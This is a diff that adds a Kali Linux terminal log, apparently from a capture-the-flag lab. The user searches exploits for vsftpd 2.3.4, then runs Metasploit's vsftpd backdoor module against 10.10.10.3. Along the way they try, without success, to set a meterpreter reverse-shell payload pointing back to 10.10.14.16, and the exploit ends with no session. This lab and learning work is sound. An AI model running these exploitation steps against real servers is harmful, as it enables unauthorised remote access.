@@ -5,3 +5,78 @@ hippoeug@kali:~$ searchsploit vsftpd 2.3.4
 vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)                                                                              | unix/remote/17491.rb
 ------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Shellcodes: No Results
+
+
+
+hippoeug@kali:~$ msfconsole
+                                                  
+
+ ______________________________________________________________________________
+|                                                                              |
+|                          3Kom SuperHack II Logon                             |
+|______________________________________________________________________________|
+|                                                                              |
+|                                                                              |
+|                                                                              |
+|                 User Name:          [   security    ]                        |
+|                                                                              |
+|                 Password:           [               ]                        |
+|                                                                              |
+|                                                                              |
+|                                                                              |
+|                                   [ OK ]                                     |
+|______________________________________________________________________________|
+|                                                                              |
+|                                                       https://metasploit.com |
+|______________________________________________________________________________|
+
+
+       =[ metasploit v5.0.99-dev                          ]
++ -- --=[ 2045 exploits - 1106 auxiliary - 344 post       ]
++ -- --=[ 562 payloads - 45 encoders - 10 nops            ]
++ -- --=[ 7 evasion                                       ]
+
+Metasploit tip: To save all commands executed since start up to a file, use the makerc command
+
+msf5 > use exploit/unix/ftp/vsftpd_234_backdoor
+[*] No payload configured, defaulting to cmd/unix/interact
+msf5 exploit(unix/ftp/vsftpd_234_backdoor) > set payload linux/x64/meterpreter/reverse_tcp
+[-] The value specified for payload is not valid.
+msf5 exploit(unix/ftp/vsftpd_234_backdoor) > set payload linux/x86/meterpreter/reverse_tcp
+[-] The value specified for payload is not valid.
+msf5 exploit(unix/ftp/vsftpd_234_backdoor) > set payload linux/x64/shell/reverse_tcp
+[-] The value specified for payload is not valid.
+msf5 exploit(unix/ftp/vsftpd_234_backdoor) > show options
+
+Module options (exploit/unix/ftp/vsftpd_234_backdoor):
+
+   Name    Current Setting  Required  Description
+   ----    ---------------  --------  -----------
+   RHOSTS                   yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RPORT   21               yes       The target port (TCP)
+
+
+Payload options (cmd/unix/interact):
+
+   Name  Current Setting  Required  Description
+   ----  ---------------  --------  -----------
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+
+msf5 exploit(unix/ftp/vsftpd_234_backdoor) > set payload linux/x64/meterpreter/reverse_tcp lhost=10.10.14.16 lport=4646
+[-] The value specified for payload is not valid.
+msf5 exploit(unix/ftp/vsftpd_234_backdoor) > set payload linux/x64/meterpreter/reverse_tcp lhost=10.10.14.16 lport=4646 -f elf
+[-] The value specified for payload is not valid.
+msf5 exploit(unix/ftp/vsftpd_234_backdoor) > set rhost 10.10.10.3
+rhost => 10.10.10.3
+msf5 exploit(unix/ftp/vsftpd_234_backdoor) > exploit
+
+[*] 10.10.10.3:21 - Banner: 220 (vsFTPd 2.3.4)
+[*] 10.10.10.3:21 - USER: 331 Please specify the password.
+[*] Exploit completed, but no session was created.
